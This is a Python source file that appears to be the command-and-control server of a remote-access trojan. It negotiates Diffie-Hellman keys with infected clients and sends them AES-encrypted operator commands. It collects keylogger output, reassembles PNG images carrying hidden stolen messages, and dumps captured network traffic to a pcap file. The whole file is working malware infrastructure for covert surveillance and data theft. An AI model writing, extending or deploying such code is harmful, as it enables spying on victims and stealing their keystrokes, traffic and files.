import socket
from pyDH import pyDH
from AES import AESCipher
import threading
import msvcrt
import time
import EncodeImg

IP_ADDRESS = '127.0.0.1'
PORT = 4921
LISTEN_COUNT = 5
RECV_LENGTH = 1025
CLOSE_CON_MSG = 'Connection with client closed.'


class Server:
    def __init__(self):
        try:
            self.dh = pyDH.DiffieHellman()
            self.private_key = self.dh.get_private_key()
            self.public_key = self.dh.gen_public_key()
            self.shared_key = None
            self.todo = ''
            self.result = ''
            self.cond = True
            self.total_data = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'
            self.pcap_data = b''
            self.connections = []
            # self.result += EncodeImg.restor_message('1.png')
        except ValueError as e:
            print("Cannot initialized")
            return

    def get_input(self):
        if msvcrt.kbhit():
            key = ord(msvcrt.getche())
            real_key = chr(key)
            if key != 13:
                self.todo += real_key

    def set_todo(self, to_do):
        self.todo = to_do

    def listen(self, server_socket, client_socket):
        while self.cond:
            try:
                try:
                    data_bytes = client_socket.recv(RECV_LENGTH)
                except:
                    client_socket.close()
                    print(CLOSE_CON_MSG)
                    return
                data = None
                try:
                    data = bytes(data_bytes).decode()
                except:
                    data = data_bytes
                if data is not None and data == '':
                    client_socket.close()
                    print(CLOSE_CON_MSG)
                else:
                    if data is not None and data.split()[0] == "1":
                        self.p = int(data.split()[1])
                        self.g = int(data.split()[2])
                        self.public_key = pow(self.g, self.private_key, self.p)
                        client_socket.send(str("2 " + str(self.public_key)).encode())
                    elif data is not None and data.split()[0] == "2":
                        self.shared_key = pow(int(data.split()[1]), self.private_key, self.p)
                        client_socket.send(str("2 " + str(self.public_key)).encode())
                        print("key changed!")
                    elif data[:1] == b'3':
                        cipher = AESCipher(str(self.shared_key))
                        data_decrypt = cipher.decrypt(data[1:]).decode()
                        # if self.todo:
                        print(self.todo)
                        cipher_text = cipher.encrypt(str('3 ' + self.todo))
                        client_socket.send(cipher_text)
                    elif data[:1] == b'4':
                        cipher = AESCipher(str(self.shared_key))
                        data_decrypt = cipher.decrypt(data[1:]).decode()
                        self.result += data_decrypt
                        time.sleep(1)
                        cipher_text = cipher.encrypt('4 Thanks')
                        client_socket.send(cipher_text)
                    elif data[:1] == b'5' or data[:1] == '5':
                        if data == '5finish':
                            new_file = open("1.png", "wb")
                            # write to file
                            new_file.write(self.total_data)
                            new_file.close()
                            self.total_data = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'
                            self.result += EncodeImg.restor_message('1.png').strip()
                        else:
                            self.total_data += data[1:]
                    elif data is not None and (data[:1] == b"6" or data[:1] == "6"):
                        cipher = AESCipher(str(self.shared_key))
                        data_decrypt = cipher.decrypt(data[1:])
                        self.result += "Key logger sent: {}".format(data_decrypt.decode('utf-8', 'ignore'))
                    elif data[:1] == b'7' or data[:1] == '7':
                        if data == '7finish':
                            new_file = open("1.pcap", "wb")
                            # write to file
                            new_file.write(self.total_data)
                            new_file.close()
                            self.pcap_data = b''
                            self.result += "pcap file was dumped"
                        else:
                            self.total_data += data[1:]


            except socket.timeout:
                print(CLOSE_CON_MSG)
                client_socket.close()

    def run(self):
        self.server_socket = socket.socket()
        self.server_socket.bind((IP_ADDRESS, PORT))
        self.server_socket.listen(LISTEN_COUNT)
        while True:
            try:
                (client_socket, address) = self.server_socket.accept()
                self.connections.append(client_socket)
                t = threading.Thread(target=self.listen, args=(self.server_socket, client_socket))
                t.start()
            except Exception as e:
                client_socket.close()
                return
            # if not t.is_alive():
            # print(CLOSE_CON_MSG)
            # client_socket.close()
